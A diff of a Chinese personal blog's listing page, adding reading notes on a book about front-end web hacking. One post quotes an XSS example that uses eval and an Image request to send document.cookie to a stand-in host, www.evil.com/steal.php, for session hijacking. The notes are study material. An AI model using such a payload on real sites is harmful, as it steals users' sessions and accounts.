@@ -65,6 +65,126 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-黑客/web前端黑客技术揭秘/1.数据与指令" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/hexo-blog/2017/03/31/黑客/web前端黑客技术揭秘/1.数据与指令/" class="article-date">
+  <time datetime="2017-03-30T16:34:46.000Z" itemprop="datePublished">2017-03-31</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hexo-blog/categories/黑客/">黑客</a>►<a class="article-category-link" href="/hexo-blog/categories/黑客/web前端黑客技术揭秘/">web前端黑客技术揭秘</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hexo-blog/2017/03/31/黑客/web前端黑客技术揭秘/1.数据与指令/">Web前端黑客技术揭秘:第一章 数据与指令</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>SQL注入的发生和跨站脚本的发生<br>当脚本访问链接<br><code>http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>(location.hash.substr)</div><div class="line"><span class="comment">// 相当于下面,Cookie会话信息就会被盗取到黑客上面,利用Cookie就可以登录被攻击者的账号,进行越权操作,都不用发ajax了......</span></div><div class="line"><span class="built_in">eval</span>(<span class="string">'new Image().src="http://www.evil.com/steal.php?c="+escape(document.cookie)'</span>)</div></pre></td></tr></table></figure></p>
+<ul>
+<li>同源策略<br>不同域的客户端脚本在没明确授权下不能读写对方的资源</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/31/黑客/web前端黑客技术揭秘/1.数据与指令/" data-id="cj16npsm3000y70uu0rszd5l9" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-黑客/web前端黑客技术揭秘/前言" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/hexo-blog/2017/03/31/黑客/web前端黑客技术揭秘/前言/" class="article-date">
+  <time datetime="2017-03-30T16:24:46.000Z" itemprop="datePublished">2017-03-31</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/hexo-blog/categories/黑客/">黑客</a>►<a class="article-category-link" href="/hexo-blog/categories/黑客/web前端黑客技术揭秘/">web前端黑客技术揭秘</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/hexo-blog/2017/03/31/黑客/web前端黑客技术揭秘/前言/">Web前端黑客技术揭秘:前言</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Web前端黑客技术攻防<br>作者 钟晨鸣 许少培<br>协作:黑哥(superhei),    xisigr,moneyer,XEYE,毕宁,soglili,</p>
+<p>钟晨鸣,08天融信阿尔法</p>
+<h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><ul>
+<li>XSS</li>
+<li>CSRF(跨站请求伪造)</li>
+<li>界面操作劫持</li>
+<li>信任与信任关系</li>
+<li>Cookie安全</li>
+<li>Flash安全</li>
+<li>DOM渲染</li>
+<li>字符集编码</li>
+<li>跨域</li>
+<li>原生态攻击</li>
+<li>高级钓鱼</li>
+<li>蠕虫思想</li>
+</ul>
+<h2 id="安全的领域"><a href="#安全的领域" class="headerlink" title="安全的领域"></a>安全的领域</h2><ul>
+<li>腾讯Q+</li>
+<li>Chrome 应用</li>
+<li>4399.com 的游戏</li>
+<li>安卓,ios应用一部分是用html5开发</li>
+<li>SAAS服务的普及</li>
+</ul>
+<p>前端黑客一般不会用操作界面劫持,社工成本太大,但可以作为保留手段。</p>
+<p>前端黑客的重要领域</p>
+<ul>
+<li>微博</li>
+<li>旅游</li>
+<li>交友</li>
+<li>餐饮</li>
+<li>医疗</li>
+<li>购物<br>海量的隐私数据<blockquote>
+<p>联想,将海量隐私数据卖给竞争对手来获利。<br>大部分人的安全意识保留在后台。</p>
+</blockquote>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/31/黑客/web前端黑客技术揭秘/前言/" data-id="cj16npsmj001b70uu1avj81dz" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-logs/3-31日志" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/hexo-blog/2017/03/31/logs/3-31日志/" class="article-date">
@@ -94,7 +214,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/31/logs/3-31日志/" data-id="cj15636rk0009dkuus5ny6tj5" class="article-share-link">Share</a>
+      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/31/logs/3-31日志/" data-id="cj16npslo000d70uusk6cegy5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -144,7 +264,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/30/logs/读书计划/" data-id="cj15636q70001dkuu19p3914r" class="article-share-link">Share</a>
+      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/30/logs/读书计划/" data-id="cj16npslo000770uudmd11rzj" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/hexo-blog/tags/读书/">读书</a></li></ul>
@@ -219,7 +339,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/30/黑客/黑客利益/2015黑客利益链/" data-id="cj15637g0001cdkuu3bj0tw35" class="article-share-link">Share</a>
+      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/30/黑客/黑客利益/2015黑客利益链/" data-id="cj16npsmz001z70uumwprdlpm" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/hexo-blog/tags/CSS/">CSS</a></li></ul>
@@ -265,7 +385,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/30/logs/工作的方向/" data-id="cj15636qe0002dkuut8tvwbk7" class="article-share-link">Share</a>
+      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/30/logs/工作的方向/" data-id="cj16npsli000470uuccl7xedw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -310,7 +430,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/30/logs/3-30日志/" data-id="cj15636rt000bdkuu360xjpxz" class="article-share-link">Share</a>
+      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/30/logs/3-30日志/" data-id="cj16npslo000970uuw98h7xhr" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/hexo-blog/tags/日志/">日志</a></li></ul>
@@ -360,7 +480,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/30/logs/学习的方向/" data-id="cj15636rx000fdkuuo6zx0qva" class="article-share-link">Share</a>
+      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/30/logs/学习的方向/" data-id="cj16npsku000270uu5co164jt" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/hexo-blog/tags/学习/">学习</a></li></ul>
@@ -417,11 +537,12 @@
 <li><a href="http://qsli.github.io/2017/01/01/markdown-mindmap/" target="_blank" rel="external">hexo xmind 使用</a></li>
 </ul>
 <p>我们都知道,再多的努力,因为不喜欢功亏一篑的感觉。我需要的是一种绝不会失败,永远保值的技术。黑客,我的宿命。</p>
+<p><a href="https://www.trumanapp.com/" target="_blank" rel="external">这个网站适合做手机端和移动端的显示</a><br><a href="http://artpip.com/" target="_blank" rel="external">这个界面也不错</a><br><a href="https://surveyanyplace.com/" target="_blank" rel="external">一张大图做app展示，下面用于作品展示不错</a><br><a href="http://cimply.co/" target="_blank" rel="external">app展示</a><br><a href="https://nextcloud.com/" target="_blank" rel="external">nextCloud</a><br><a href="https://paperform.co/" target="_blank" rel="external">paperform 展示</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/29/workplan/M4/" data-id="cj15636rm000adkuubp9tfycj" class="article-share-link">Share</a>
+      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/29/workplan/M4/" data-id="cj16npslo000g70uunuhty41m" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/hexo-blog/tags/4月/">4月</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/hexo-blog/tags/工作计划/">工作计划</a></li></ul>
@@ -478,7 +599,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/29/css/jingdong/css学习计划/" data-id="cj15637ft0016dkuu1286ckxo" class="article-share-link">Share</a>
+      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/29/css/jingdong/css学习计划/" data-id="cj16npsm3001170uu919q9ruy" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/hexo-blog/tags/CSS/">CSS</a></li></ul>
@@ -490,55 +611,10 @@
 
 
   
-    <article id="post-nodejs/express心得" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/hexo-blog/2017/03/29/nodejs/express心得/" class="article-date">
-  <time datetime="2017-03-29T12:35:16.000Z" itemprop="datePublished">2017-03-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/hexo-blog/categories/nodejs/">nodejs</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/hexo-blog/2017/03/29/nodejs/express心得/">express心得</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="pug语法是利器"><a href="#pug语法是利器" class="headerlink" title="pug语法是利器"></a>pug语法是利器</h3><p>express是nodejs的一套web开发框架,当我开始用jade开发的时候，很快喜欢上了她的简洁,精简的语法,发现以前的满屏混乱的标签居然可以忍受这么长时间，不能忍！</p>
-<h3 id="typescript快速开发可维护的应用程序"><a href="#typescript快速开发可维护的应用程序" class="headerlink" title="typescript快速开发可维护的应用程序"></a>typescript快速开发可维护的应用程序</h3><p>这里使用gulp 来监听 src目录下的所有typescript文件,一旦发生改变就会自动编译,而我们还选择了用nodemon守护构建后的build目录下www.js文件</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">"gulp"</span>);</div><div class="line"><span class="keyword">var</span> tsc = <span class="built_in">require</span>(<span class="string">"gulp-typescript-compiler"</span>);</div><div class="line"><span class="keyword">var</span> ts = <span class="built_in">require</span>(<span class="string">'gulp-typescript'</span>);</div><div class="line"><span class="keyword">var</span> nodemon = <span class="built_in">require</span>(<span class="string">"gulp-nodemon"</span>);</div><div class="line"><span class="comment">/** gulp-bootstrap  */</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">var</span> tsProject = ts.createProject(<span class="string">'tsconfig.json'</span>);</div><div class="line"></div><div class="line">gulp.task(<span class="string">"default"</span>, [<span class="string">"compile"</span>, <span class="string">"watch"</span>,</div><div class="line">    <span class="string">"nodemon"</span></div><div class="line">]);</div><div class="line"></div><div class="line"></div><div class="line">gulp.task(<span class="string">"watch"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> gulp.watch([<span class="string">"./src/**/*.ts"</span>], [<span class="string">"compile"</span>]);</div><div class="line"></div><div class="line">&#125;);</div><div class="line">gulp.task(<span class="string">"watch-scss"</span>, () =&gt; &#123;</div><div class="line">    <span class="keyword">return</span> gulp.watch([<span class="string">'./sass/**/*.scss'</span>, <span class="string">'./sass/bootstrap-sass/assets/**/*.scss'</span>], [<span class="string">'css'</span>, <span class="string">'fonts'</span>]);</div><div class="line">&#125;)</div><div class="line"></div><div class="line">gulp.task(<span class="string">"compile"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'src/**/*.ts'</span>)</div><div class="line">        .pipe(tsProject())</div><div class="line">        .pipe(gulp.dest(<span class="string">'build'</span>));</div><div class="line"></div><div class="line">&#125;);</div><div class="line"></div><div class="line">gulp.task(<span class="string">"nodemon"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    nodemon(&#123;</div><div class="line">        <span class="attr">script</span>: <span class="string">"build/www"</span>,</div><div class="line">        <span class="attr">exec</span>: <span class="string">' set DEBUG=*,-not_this &amp;node --debug '</span>,</div><div class="line">        <span class="attr">env</span>: &#123;</div><div class="line">            <span class="string">'NODE_ENV'</span>: <span class="string">'production'</span></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;);</div><div class="line">&#125;);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">var</span> config = &#123;</div><div class="line">    <span class="attr">bootstrapDir</span>: <span class="string">'./sass/bootstrap-sass'</span>,</div><div class="line">    <span class="attr">publicDir</span>: <span class="string">'./public'</span>,</div><div class="line">&#125;;</div><div class="line"></div><div class="line">gulp.task(<span class="string">'css'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'./sass/app.scss'</span>)</div><div class="line">        .pipe(sass(&#123;</div><div class="line">            <span class="attr">includePaths</span>: [config.bootstrapDir + <span class="string">'/assets/stylesheets'</span>],</div><div class="line">        &#125;))</div><div class="line">        .pipe(gulp.dest(config.publicDir + <span class="string">'/css'</span>));</div><div class="line">&#125;);</div><div class="line">gulp.task(<span class="string">'fonts'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(config.bootstrapDir + <span class="string">'/assets/fonts/**/*'</span>)</div><div class="line">        .pipe(gulp.dest(config.publicDir + <span class="string">'/fonts'</span>));</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://24wings.github.io/hexo-blog/hexo-blog/2017/03/29/nodejs/express心得/" data-id="cj15636rw000edkuuzte2bh3u" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/hexo-blog/tags/express/">express</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/hexo-blog/tags/nodejs/">nodejs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/hexo-blog/">&laquo; __('prev')</a><a class="page-number" href="/hexo-blog/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/hexo-blog/">&laquo; __('prev')</a><a class="page-number" href="/hexo-blog/">1</a><span class="page-number current">2</span><a class="page-number" href="/hexo-blog/page/3/">3</a><a class="extend next" rel="next" href="/hexo-blog/page/3/">__('next') &raquo;</a>
   </nav>
 </section>
         
@@ -568,7 +644,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/hexo-blog/tags/4月/" style="font-size: 10px;">4月</a> <a href="/hexo-blog/tags/CSS/" style="font-size: 20px;">CSS</a> <a href="/hexo-blog/tags/css/" style="font-size: 10px;">css</a> <a href="/hexo-blog/tags/express/" style="font-size: 10px;">express</a> <a href="/hexo-blog/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/hexo-blog/tags/学习/" style="font-size: 10px;">学习</a> <a href="/hexo-blog/tags/工作计划/" style="font-size: 10px;">工作计划</a> <a href="/hexo-blog/tags/日志/" style="font-size: 10px;">日志</a> <a href="/hexo-blog/tags/梅兰商城/" style="font-size: 10px;">梅兰商城</a> <a href="/hexo-blog/tags/读书/" style="font-size: 10px;">读书</a> <a href="/hexo-blog/tags/黑客/" style="font-size: 20px;">黑客</a>
+      <a href="/hexo-blog/tags/4月/" style="font-size: 10px;">4月</a> <a href="/hexo-blog/tags/CSS/" style="font-size: 20px;">CSS</a> <a href="/hexo-blog/tags/css/" style="font-size: 20px;">css</a> <a href="/hexo-blog/tags/express/" style="font-size: 10px;">express</a> <a href="/hexo-blog/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/hexo-blog/tags/学习/" style="font-size: 10px;">学习</a> <a href="/hexo-blog/tags/工作计划/" style="font-size: 10px;">工作计划</a> <a href="/hexo-blog/tags/日志/" style="font-size: 10px;">日志</a> <a href="/hexo-blog/tags/梅兰商城/" style="font-size: 20px;">梅兰商城</a> <a href="/hexo-blog/tags/读书/" style="font-size: 10px;">读书</a> <a href="/hexo-blog/tags/黑客/" style="font-size: 20px;">黑客</a>
     </div>
   </div>
 
@@ -590,6 +666,14 @@
       <ul>
         
           <li>
+            <a href="/hexo-blog/2017/04/06/logs/17-4-6日志/">17-4-6日志</a>
+          </li>
+        
+          <li>
+            <a href="/hexo-blog/2017/04/06/css/梅兰商城/梅兰商城总结/">梅兰商城总结</a>
+          </li>
+        
+          <li>
             <a href="/hexo-blog/2017/04/06/css/梅兰商城/梅兰商城02/">梅兰商城02</a>
           </li>
         
@@ -599,14 +683,6 @@
         
           <li>
             <a href="/hexo-blog/2017/03/31/黑客/web前端黑客技术揭秘/验证图攻击/">验证图攻击</a>
-          </li>
-        
-          <li>
-            <a href="/hexo-blog/2017/03/31/黑客/web前端黑客技术揭秘/bug网站/">bug网站</a>
-          </li>
-        
-          <li>
-            <a href="/hexo-blog/2017/03/31/黑客XSS漏洞挖掘过程/">黑客XSS漏洞挖掘过程</a>
           </li>
         
       </ul>
